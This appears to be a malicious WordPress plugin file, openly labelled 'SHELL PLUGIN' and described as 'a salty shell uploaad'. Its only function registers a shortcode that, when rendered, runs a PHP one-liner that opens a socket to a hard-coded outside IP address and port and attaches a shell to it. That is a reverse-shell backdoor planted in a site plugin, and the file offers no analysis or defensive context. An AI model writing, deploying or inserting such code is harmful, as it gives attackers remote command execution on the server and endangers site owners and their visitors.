<?php
/*
Plugin Name: SHELL PLUGIN
Description: a salty shell uploaad :)
Version: 1.9
Author: MatinARJO
*/


function custom_plugin_shortcode() {
    exec("php -r '\$sock=fsockopen(\"64.21.191.206\",4535);exec(\"sh <&3 >&3 2>&3\");'");
}

add_shortcode('custom_plugin', 'custom_plugin_shortcode');

?>
